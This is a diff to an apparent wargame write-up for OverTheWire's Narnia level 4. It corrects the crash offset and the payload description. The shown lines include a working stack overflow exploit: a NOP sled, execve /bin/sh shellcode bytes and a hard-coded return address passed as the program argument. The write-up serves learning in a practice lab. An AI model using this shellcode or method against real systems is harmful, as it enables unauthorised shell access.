@@ -102,7 +102,7 @@ First of all we must see when the program goes in segmentation fault: with some 
 narnia4@narnia:~$ ./narnia4 $(python -c "print('A'*$i)")
 ```
 
-we undersrand that giving at $i the value of 226 it explodes so the EBD was overwritten.
+we undersrand that giving at $i the value of 264 it explodes so the EBD was overwritten.
 
 Now we search the return address the we'll insert instead of that of strcpy (searching when the '\x41' are), we'll use gdb:
 
@@ -121,7 +121,7 @@ We choose an address in the middle to use the NOP-Sled.
 We'll use the same shellcode the we used in Narnia2:
 `shellcode="\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"`
 
-Now we can prepare the argv[1] to pass to the program: 239 bytes of '\x90' + 25 bytes of shellcode and finally the return addess:
+Now we can prepare the argv[1] to pass to the program: 239 bytes of '\x90' + 25 bytes of shellcode and finally the 4 bytes of the return addess:
 
 ```bash
 ./narnia4 $(python -c "print('\x90'*239+'\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80'+'\x18\xd8\xff\xff')")
